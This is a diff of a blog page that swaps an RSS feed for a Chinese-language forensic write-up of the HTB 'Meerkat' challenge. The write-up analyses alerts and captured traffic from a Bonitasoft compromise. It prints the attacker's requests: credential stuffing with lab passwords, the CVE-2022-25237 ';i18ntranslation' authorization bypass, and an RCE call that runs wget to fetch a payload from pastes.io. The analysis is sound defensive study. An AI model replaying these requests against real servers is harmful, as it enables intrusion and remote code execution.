@@ -1,36 +1,237 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
-  <channel>
-    <title>Wuvoun</title>
-    <link>https://wuvoun.github.io/</link>
-    <description>Recent content from Wuvoun</description>
-    <generator>Hugo</generator>
-    <language>zh-cn</language>
-    
-    <managingEditor>253567768@qq.com (Wuvoun)</managingEditor>
-    <webMaster>253567768@qq.com (Wuvoun)</webMaster>
-    
-    <copyright>All articles on this blog are licensed under the BY-NC-SA license agreement unless otherwise stated. Please indicate the source when reprinting!</copyright>
-    
-    <lastBuildDate>Thu, 11 Sep 2025 02:45:13 +0800</lastBuildDate>
-    
-    
-    <atom:link href="https://wuvoun.github.io/index.xml" rel="self" type="application/rss&#43;xml" />
-    
+<!doctype html>
+<html
+  lang="zh-cn" 
+  data-theme-mode="auto"
+  >
+  <head><meta charset="utf-8" />
+<meta
+  name="viewport"
+  content="width=device-width, initial-scale=1, shrink-to-fit=no"
+/><title>
+  HTB Meerkat | Wuvoun
+</title>
+<meta
+  name="description"
+  content="少女祈祷中..."
+/><script>
+  window.siteConfig = JSON.parse("{\"anchor_icon\":null,\"base\":\"https://wuvoun.github.io/\",\"clipboard\":{\"copyright\":{\"count\":50,\"enable\":false,\"license_type\":\"by-nc-sa\"},\"fail\":{\"en\":\"Copy failed (ﾟ⊿ﾟ)ﾂ\",\"ja\":\"コピー失敗 (ﾟ⊿ﾟ)ﾂ\",\"pt-br\":\"Falha ao copiar (ﾟ⊿ﾟ)ﾂ\",\"zh-cn\":\"复制失败 (ﾟ⊿ﾟ)ﾂ\",\"zh-tw\":\"複製失敗 (ﾟ⊿ﾟ)ﾂ\"},\"success\":{\"en\":\"Copy successfully (*^▽^*)\",\"ja\":\"コピー成功 (*^▽^*)\",\"pt-br\":\"Copiado com sucesso (*^▽^*)\",\"zh-cn\":\"复制成功 (*^▽^*)\",\"zh-tw\":\"複製成功 (*^▽^*)\"}},\"code_block\":{\"expand\":true},\"icon_font\":\"4552607_0khxww3tj3q9\",\"outdate\":{\"daysago\":180,\"enable\":false,\"message\":{\"en\":\"This article was last updated on {time}. Please note that the content may no longer be applicable.\",\"ja\":\"この記事は最終更新日：{time}。記載内容が現在有効でない可能性がありますのでご注意ください。\",\"pt-br\":\"Este artigo foi atualizado pela última vez em {time}. Observe que o conteúdo pode não ser mais aplicável.\",\"zh-cn\":\"本文最后更新于 {time}，请注意文中内容可能已不适用。\",\"zh-tw\":\"本文最後更新於 {time}，請注意文中內容可能已不適用。\"}}}");
+  
+</script>
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link
+  rel="preload"
+  as="style"
+  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
+/>
+<link
+  rel="stylesheet"
+  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
+  media="print"
+  onload="this.media='all'"
+/>
+<link
+    rel="preload"
+    href="//at.alicdn.com/t/c/font_4552607_0khxww3tj3q9.woff2"
+    as="font"
+    type="font/woff2"
+    crossorigin="anonymous"
+  /><link rel="stylesheet" href="/css/loader.min.ac746e154f756f8220326eeb52a719f142ab038be5a8ddf30ea5ef15ef2356ea.css" />
+<meta property="og:type" content="website" />
+  <meta property="og:title" content="HTB Meerkat | Wuvoun" />
+  <meta
+    property="og:description"
+    content="少女祈祷中..."
+  />
+  <meta property="og:url" content="https://wuvoun.github.io/post/htb-meerkat/" />
+  <meta
+    property="og:site_name"
+    content="Wuvoun"
+  />
+  <meta
+    property="og:image"
+    content="/"
+  />
+  <meta property="article:author" content="Wuvoun" />
+  <meta property="article:published_time" content="2025-09-11T02:45:13&#43;08:00" />
+  <meta property="article:modified_time" content="2025-09-11T02:45:13&#43;08:00" /><meta property="article:tag" content="SOC" /><meta name="twitter:card" content="summary" />
+  <meta name="twitter:image" content="/" />
+<link rel="shortcut icon" href="/favicon1.ico"><link rel="stylesheet" href="/css/main.min.5a853f279b790b623408299f44544bf0b98ef360d87a9d68d6dcd3848c735f90.css" />
+<link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css"
+    integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei&#43;Zx/1oA/0l8ysE" crossorigin="anonymous"onload="this.onload=null;this.rel='stylesheet'"
+  /><link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/katex@0.16.22/dist/katex.min.css"
+    integrity="sha384-5TcZemv2l/9On385z///&#43;d7MSYlvIEw9FuZTIdZ14vJLqWphw7e7ZPuOiCHJcFCP" crossorigin="anonymous"onload="this.onload=null;this.rel='stylesheet'"
+  /><script
+    src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"
+    integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script><link
+    rel="stylesheet"
+    href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css"
+    integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous"/></head>
+  <body><div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate"><svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+          M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg></div><div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script><div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+<div id="lang-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+This article does not have a corresponding language version
+</div>
+<div id="heatmap-tooltip"></div><div id="container">
+      <div id="wrap"><div id="header-nav">
+  <nav id="main-nav"><span class="main-nav-link-wrap">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <a class="main-nav-link" href="/">Home</a>
+      </span><span class="main-nav-link-wrap">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <a class="main-nav-link" href="/archives">Archives</a>
+      </span><span class="main-nav-link-wrap">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <a class="main-nav-link" href="/about">About</a>
+      </span><a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav"></nav></div>
+<header id="header"><picture></picture><img  fetchpriority="high" src="/images/banner.png" alt="HTB Meerkat"><div id="header-outer">
+    <div id="header-title"><a href="/" id="logo">
+            <h1 data-aos="slide-up">HTB Meerkat</h1>
+          </a><h2 id="subtitle-wrap" data-aos="slide-down"></h2></div>
+  </div>
+</header><div id="content"
+          
+          class="sidebar-right"  ><aside id="sidebar"><div class="sidebar-wrapper wrap-sticky">
+    <div
+      class="sidebar-wrap"
+      data-aos="fade-up"
+    ><div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class">
+    <nav id="TableOfContents"></nav>
+  </div>
+</div></div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img
+    data-src="/avatar/../images/avatar.webp"
+    data-sizes="auto"
+    alt="Wuvoun"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">Wuvoun</div>
+  <div class="sidebar-description">少女祈祷中...</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div><div class="sidebar-state-number">4</div>
+  </div>
+  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
+    <div>Categories</div>
+    <div class="sidebar-state-number">
+      2
+    </div>
+  </a>
+  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
+    <div>Tags</div>
+    <div class="sidebar-state-number">4</div>
+  </a>
+</div>
+<div class="sidebar-social"></div>
+<div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="Home"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">Home</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="Archives"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">Archives</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="About"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">About</div>
+    </div></div>
+</div><div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div></div>
+  </div>
 
-    
-    
-
-    <item>
-      <title>HTB Meerkat</title>
-      <link>https://wuvoun.github.io/post/htb-meerkat/</link>
-      <pubDate>Thu, 11 Sep 2025 02:45:13 &#43;0800</pubDate>
-      <author>253567768@qq.com (Wuvoun)</author>
-      <guid>https://wuvoun.github.io/post/htb-meerkat/</guid>
-      <description>
-        <![CDATA[<h1>HTB Meerkat</h1><p>Author: Wuvoun(253567768@qq.com)</p>
-        
-          <h1 id="htb-meerkat">
+  <div class="sidebar-widget"></div></aside>
+<section id="main"><article
+  class="h-entry article"
+  itemprop="blogPost"
+  itemscope
+  itemtype="https://schema.org/BlogPosting"
+>
+  <div
+    class="article-inner"
+    data-aos="fade-up"
+  >
+    <div class="article-meta"><div class="article-date">
+  <span
+    class="article-date-link"
+    data-aos="zoom-in"
+  >
+    <time datetime="2025-09-11 02:45:13 &#43;0800 CST" itemprop="datePublished"
+      >2025-09-11</time
+    >
+    <time style="display: none;" id="post-update-time"
+      >2025-09-11</time
+    >
+  </span>
+</div>
+<div class="article-category"><a
+      class="article-category-link"
+      href="/categories/htb"
+      data-aos="zoom-in"
+      >HTB</a
+    ></div>
+</div>
+    <div class="hr-line"></div><div class="e-content article-entry" itemprop="articleBody"><h1 id="htb-meerkat">
 <a class="header-anchor" href="#htb-meerkat"></a>
 HTB-Meerkat
 </h1><p>提供了一个流量包和meerkat-alerts.json文件，先分析meerkat-alerts.json文件，提取报警信息</p>
@@ -380,183 +581,352 @@ HTB-Meerkat
 <li><strong>We believe our Business Management Platform server has been compromised. Please can you confirm the name of the application running?</strong></li>
 </ol>
 <p>由分析題目提供的 <code>meerkat-alerts.json</code> 文件，可以知道 <code>ET EXPLOIT Bonitasoft Authorization Bypass M1 (CVE-2022-25237)</code></p>
-        
-        <hr><p>Published on 2025-09-11 at <a href='https://wuvoun.github.io/'>Wuvoun</a>, last modified on 2025-09-11</p>]]>
-      </description>
-      
-        <category>HTB</category>
-      
-    </item>
-    
-    
-
-    <item>
-      <title>HTB Pikaptcha</title>
-      <link>https://wuvoun.github.io/post/htb-pikaptcha/</link>
-      <pubDate>Wed, 10 Sep 2025 03:37:27 &#43;0800</pubDate>
-      <author>253567768@qq.com (Wuvoun)</author>
-      <guid>https://wuvoun.github.io/post/htb-pikaptcha/</guid>
-      <description>
-        <![CDATA[<h1>HTB Pikaptcha</h1><p>Author: Wuvoun(253567768@qq.com)</p>
-        
-          <h1 id="htb-pikaptcha">
-<a class="header-anchor" href="#htb-pikaptcha"></a>
-HTB-Pikaptcha
-</h1><ol>
-<li><strong>It is crucial to understand any payloads executed on the system for initial access. Analyzing registry hive for user happy grunwald. What is the full command that was run to download and execute the stager.</strong></li>
-</ol>
-<p><code>NTUSER.DAT</code> 是 <strong>Windows 用户注册表配置单元 (registry hive)</strong> 文件，它保存了用户级别的配置和活动痕迹。每个用户登录系统时，都会有一个 <code>NTUSER.DAT</code> 文件存放在该用户的 <strong>用户配置目录</strong> 下，它其实就是注册表的 <code>HKEY_CURRENT_USER (HKCU)</code> 分支，里面包含：</p>
-<ul>
-<li><strong>软件配置</strong>：应用的设置、偏好。</li>
-<li><strong>最近使用记录</strong>：比如运行过的命令、访问过的路径。</li>
-<li><strong>持久化位置</strong>：启动项</li>
-</ul>
-<p><code>NTUSER.DAT</code>  文件常见取证路径：</p>
-<ul>
-<li>
-<p><code>HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU</code></p>
-<p>→ 用户在运行框里输入过的命令。</p>
-</li>
-<li>
-<p><code>HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist</code></p>
-<p>→ Base64/ROT13 编码的执行过的程序路径。</p>
-</li>
-<li>
-<p><code>HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths</code></p>
-<p>→ 资源管理器输入过的路径。</p>
-</li>
-<li>
-<p><code>RecentApps</code>、<code>ComDlg32</code></p>
-<p>→ 最近使用的应用/文件</p>
-        
-        <hr><p>Published on 2025-09-10 at <a href='https://wuvoun.github.io/'>Wuvoun</a>, last modified on 2025-09-10</p>]]>
-      </description>
-      
-        <category>HTB</category>
-      
-    </item>
-    
-    
-
-    <item>
-      <title>HTB-NeuroSync D</title>
-      <link>https://wuvoun.github.io/post/neurosync-d/</link>
-      <pubDate>Tue, 09 Sep 2025 02:27:06 &#43;0800</pubDate>
-      <author>253567768@qq.com (Wuvoun)</author>
-      <guid>https://wuvoun.github.io/post/neurosync-d/</guid>
-      <description>
-        <![CDATA[<h1>HTB-NeuroSync D</h1><p>Author: Wuvoun(253567768@qq.com)</p>
-        
-          <h1 id="htb-neurosync-d">
-<a class="header-anchor" href="#htb-neurosync-d"></a>
-HTB-NeuroSync-D
-</h1><p>题目给出下列日志：</p>
-<ul>
-<li><strong>access.log</strong>
-<ul>
-<li>一般是 Web 服务器（Nginx/Apache）或网关的访问日志。</li>
-<li>记录请求 IP、时间、URL、状态码、UA。</li>
-</ul>
-</li>
-<li><strong>bci-device.log</strong>
-<ul>
-<li>可能和系统里的某个 <strong>BCI（Brain-Computer Interface）设备</strong> 或类似命名的模块相关。</li>
-<li>常见用途：设备状态、连接信息、错误上报。</li>
-</ul>
-</li>
-<li><strong>data-api.log</strong>
-<ul>
-<li>通常是后端的数据接口服务日志。</li>
-<li>可能包含 API 请求参数、响应、异常堆栈。</li>
-<li>常用于调试接口调用和数据交互问题。</li>
-</ul>
-</li>
-<li><strong>interface.log</strong>
-<ul>
-<li>Next.js 开发服务器 (<code>next dev</code>) 的运行日志</li>
-</ul>
-</li>
-<li><strong>redis.log</strong>
-<ul>
-<li>Redis 数据库的运行日志。</li>
-<li>一般包含启动信息、持久化状态、错误（比如连接异常、内存不足、RDB/AOF 保存情况）。</li>
-</ul>
-</li>
-</ul>
+<p>攻击者通过<code>CVE-2022-25237</code> 攻击 <code>Bonitasoft</code> 平台</p>
 <ol>
-<li><strong>What version of Next.js is the application using?</strong></li>
+<li><strong>We believe the attacker may have used a subset of the brute forcing attack category - what is the name of the attack carried out?</strong></li>
 </ol>
-<p>查看 <strong><code>interface.log</code>日志，可以知道Next.js 15.1.0</strong></p>
-<p><img src="https://github.com/wuvoun/picx-images-hosting/raw/master/image.4jogeg4ij3.png" alt="image.png"></p>
-<ol start="2">
-<li><strong>What local port is the Next.js-based application running on?</strong></li>
+<p>通过分析<code>meerkat-alerts.json</code>，可以知道被攻击机的IP为172.31.6.4，wireshark过滤</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ip.addr<span style="color:#f92672">==</span>172.31.6.44 and http
+</span></span></code></pre></div><p><img src="https://github.com/wuvoun/picx-images-hosting/raw/master/image.7zqs9eezf6.webp" alt="image.png"></p>
+<p>发现大量的凭据爆破，为 <code>credential stuffing</code> 攻击</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>POST /bonita/loginservice HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: forela.co.uk:8080
+</span></span><span style="display:flex;"><span>User-Agent: python-requests/2.28.1
+</span></span><span style="display:flex;"><span>Accept-Encoding: gzip, deflate
+</span></span><span style="display:flex;"><span>Accept: */*
+</span></span><span style="display:flex;"><span>Connection: keep-alive
+</span></span><span style="display:flex;"><span>Content-Type: application/x-www-form-urlencoded
+</span></span><span style="display:flex;"><span>Cookie: x<span style="color:#f92672">=</span>x
+</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">39</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>username<span style="color:#f92672">=</span>install&amp;password<span style="color:#f92672">=</span>install&amp;_l<span style="color:#f92672">=</span>en
+</span></span><span style="display:flex;"><span>HTTP/1.1 <span style="color:#ae81ff">401</span> 
+</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>Date: Thu, <span style="color:#ae81ff">19</span> Jan <span style="color:#ae81ff">2023</span> 15:31:30 GMT
+</span></span><span style="display:flex;"><span>Keep-Alive: timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">20</span>
+</span></span><span style="display:flex;"><span>Connection: keep-alive
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>POST /bonita/loginservice HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: forela.co.uk:8080
+</span></span><span style="display:flex;"><span>User-Agent: python-requests/2.28.1
+</span></span><span style="display:flex;"><span>Accept-Encoding: gzip, deflate
+</span></span><span style="display:flex;"><span>Accept: */*
+</span></span><span style="display:flex;"><span>Connection: keep-alive
+</span></span><span style="display:flex;"><span>Content-Type: application/x-www-form-urlencoded
+</span></span><span style="display:flex;"><span>Cookie: x<span style="color:#f92672">=</span>x
+</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">64</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>username<span style="color:#f92672">=</span>Clerc.Killich%40forela.co.uk&amp;password<span style="color:#f92672">=</span>vYdwoVhGIwJ&amp;_l<span style="color:#f92672">=</span>en
+</span></span><span style="display:flex;"><span>HTTP/1.1 <span style="color:#ae81ff">401</span> 
+</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>Date: Thu, <span style="color:#ae81ff">19</span> Jan <span style="color:#ae81ff">2023</span> 15:31:34 GMT
+</span></span><span style="display:flex;"><span>Keep-Alive: timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">20</span>
+</span></span><span style="display:flex;"><span>Connection: keep-alive
+</span></span></code></pre></div><ol>
+<li><strong>Does the vulnerability exploited have a CVE assigned - and if so, which one?</strong></li>
 </ol>
-<p>上一题的截图中显示了程序运行在3000端口</p>
-<ol start="3">
-<li><strong>A critical Next.js vulnerability was released in March 2025, and this version appears to be affected. What is the CVE identifier for this vulnerability?</strong></li>
+<p>由题一可以知道CVE为 <code>CVE-2022-25237</code></p>
+<p><img src="https://github.com/wuvoun/picx-images-hosting/raw/master/image-1.5mo5s7168c.webp" alt="image.png"></p>
+<ol>
+<li><strong>Which string was appended to the API URL path to bypass the authorization filter by the attacker&rsquo;s exploit?</strong></li>
 </ol>
-<p><img src="https://github.com/wuvoun/picx-images-hosting/raw/master/image-1.8ok1qk1olf.png" alt="image.png"></p>
-        
-        <hr><p>Published on 2025-09-09 at <a href='https://wuvoun.github.io/'>Wuvoun</a>, last modified on 2025-09-09</p>]]>
-      </description>
-      
-        <category>HTB</category>
-      
-    </item>
-    
-    
+<p>分析流量包，找到认证成功的流量</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>POST /bonita/API/pageUpload;i18ntranslation?action<span style="color:#f92672">=</span>add HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: forela.co.uk:8080
+</span></span><span style="display:flex;"><span>User-Agent: python-requests/2.28.1
+</span></span><span style="display:flex;"><span>Accept-Encoding: gzip, deflate
+</span></span><span style="display:flex;"><span>Accept: */*
+</span></span><span style="display:flex;"><span>Connection: keep-alive
+</span></span><span style="display:flex;"><span>Cookie: JSESSIONID<span style="color:#f92672">=</span>0AD5E14F8D1AE496444835639D0E60A9; X-Bonita-API-Token<span style="color:#f92672">=</span>8b71f28f-31aa-47cb-92b6-50521cd5bf92; bonita.tenant<span style="color:#f92672">=</span>1; BOS_Locale<span style="color:#f92672">=</span>en
+</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">15163</span>
+</span></span><span style="display:flex;"><span>Content-Type: multipart/form-data; boundary<span style="color:#f92672">=</span>f79968fcad082cab61a2fc649dab366c
+</span></span></code></pre></div><p>字符串为 <code>i18ntranslation</code></p>
+<p><img src="https://github.com/wuvoun/picx-images-hosting/raw/master/image-2.9ddbdfq1fy.webp" alt="image.png"></p>
+<ol>
+<li><strong>How many combinations of usernames and passwords were used in the credential stuffing attack?</strong></li>
+</ol>
+<p>最后三条流量都是以seb.broom@forela.co.uk进行认证</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Timestamps,POST /bonita/loginservice HTTP/1.1<span style="color:#ae81ff">\\</span>r<span style="color:#ae81ff">\\</span>n,<span style="color:#ae81ff">\\</span>r<span style="color:#ae81ff">\\</span>n,Form item: <span style="color:#e6db74">&#34;username&#34;</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;seb.broom@forela.co.uk&#34;</span>,Form item: <span style="color:#e6db74">&#34;password&#34;</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;g0vernm3nt&#34;</span>,Form item: <span style="color:#e6db74">&#34;_l&#34;</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;en&#34;</span>
+</span></span></code></pre></div><p><img src="https://github.com/wuvoun/picx-images-hosting/raw/master/image-3.7snkdystzl.webp" alt="image.png"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>tshark -r meerkat.pcap -Y <span style="color:#e6db74">&#39;http.request.method == &#34;POST&#34; &amp;&amp; http.request.uri == &#34;/bonita/loginservice&#34; &#39;</span> <span style="color:#ae81ff">\-</span>T fields -e text | grep -v <span style="color:#e6db74">&#39;&#34;username&#34; = &#34;install&#34;&#39;</span> | wc -l
+</span></span><span style="display:flex;"><span>Running as user <span style="color:#e6db74">&#34;root&#34;</span> and group <span style="color:#e6db74">&#34;root&#34;</span>. This could be dangerous.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">59</span>
+</span></span></code></pre></div><p>59条流量爆破，除去最后的三条，一共56条爆破</p>
+<ol>
+<li><strong>Which username and password combination was successful?</strong></li>
+</ol>
+<p>由题四可知,使用 [<code>seb.broom@forela.co.uk](mailto:seb.broom@forela.co.uk):g0vernm3nt</code> 认证成功</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>POST /bonita/loginservice HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: forela.co.uk:8080
+</span></span><span style="display:flex;"><span>User-Agent: python-requests/2.28.1
+</span></span><span style="display:flex;"><span>Accept-Encoding: gzip, deflate
+</span></span><span style="display:flex;"><span>Accept: */*
+</span></span><span style="display:flex;"><span>Connection: keep-alive
+</span></span><span style="display:flex;"><span>Content-Type: application/x-www-form-urlencoded
+</span></span><span style="display:flex;"><span>Cookie: x<span style="color:#f92672">=</span>x
+</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">59</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>username<span style="color:#f92672">=</span>seb.broom%40forela.co.uk&amp;password<span style="color:#f92672">=</span>g0vernm3nt&amp;_l<span style="color:#f92672">=</span>en
+</span></span><span style="display:flex;"><span>HTTP/1.1 <span style="color:#ae81ff">204</span> 
+</span></span><span style="display:flex;"><span>Set-Cookie: bonita.tenant<span style="color:#f92672">=</span>1; SameSite<span style="color:#f92672">=</span>Lax
+</span></span><span style="display:flex;"><span>Set-Cookie: JSESSIONID<span style="color:#f92672">=</span>0AD5E14F8D1AE496444835639D0E60A9; Path<span style="color:#f92672">=</span>/bonita; HttpOnly; SameSite<span style="color:#f92672">=</span>Lax
+</span></span><span style="display:flex;"><span>Set-Cookie: X-Bonita-API-Token<span style="color:#f92672">=</span>8b71f28f-31aa-47cb-92b6-50521cd5bf92; Path<span style="color:#f92672">=</span>/bonita; SameSite<span style="color:#f92672">=</span>Lax
+</span></span><span style="display:flex;"><span>Set-Cookie: BOS_Locale<span style="color:#f92672">=</span>en; Path<span style="color:#f92672">=</span>/; SameSite<span style="color:#f92672">=</span>Lax
+</span></span><span style="display:flex;"><span>Date: Thu, <span style="color:#ae81ff">19</span> Jan <span style="color:#ae81ff">2023</span> 15:38:38 GMT
+</span></span><span style="display:flex;"><span>Keep-Alive: timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">20</span>
+</span></span><span style="display:flex;"><span>Connection: keep-alive
+</span></span></code></pre></div><ol>
+<li><strong>If any, which text sharing site did the attacker utilise?</strong></li>
+</ol>
+<p>wireshark 过滤器</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>http.request.method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;POST&#34;</span>  and ip.addr<span style="color:#f92672">==</span>172.31.6.44 and http
+</span></span></code></pre></div><p><a href="http://%E5%8F%91%E7%8E%B0%E4%BB%8Epastes.io">发现从</a> <code>https://pastes.io/</code> 这个网站下载bx5gcr0et8 文件</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>GET /bonita/API/extension/rce?p<span style="color:#f92672">=</span>0&amp;c<span style="color:#f92672">=</span>1&amp;cmd<span style="color:#f92672">=</span>wget%20https://pastes.io/raw/bx5gcr0et8 HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: forela.co.uk:8080
+</span></span><span style="display:flex;"><span>User-Agent: python-requests/2.28.1
+</span></span><span style="display:flex;"><span>Accept-Encoding: gzip, deflate
+</span></span><span style="display:flex;"><span>Accept: */*
+</span></span><span style="display:flex;"><span>Connection: keep-alive
+</span></span><span style="display:flex;"><span>Cookie: JSESSIONID<span style="color:#f92672">=</span>745EE4F7243DA99264F07781FBB9B4E3; X-Bonita-API-Token<span style="color:#f92672">=</span>1ccb3fac-8abd-4cc0-a52e-bb5811198cdf; bonita.tenant<span style="color:#f92672">=</span>1; BOS_Locale<span style="color:#f92672">=</span>en
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>HTTP/1.1 <span style="color:#ae81ff">200</span> 
+</span></span><span style="display:flex;"><span>Cache-Control: no-store, no-cache, must-revalidate, proxy-revalidate
+</span></span><span style="display:flex;"><span>Date: Thu, <span style="color:#ae81ff">19</span> Jan <span style="color:#ae81ff">2023</span> 15:38:53 GMT
+</span></span><span style="display:flex;"><span>Accept-Ranges: bytes
+</span></span><span style="display:flex;"><span>Server: Restlet-Framework/2.3.12
+</span></span><span style="display:flex;"><span>Content-Type: application/json;charset<span style="color:#f92672">=</span>UTF-8
+</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">544</span>
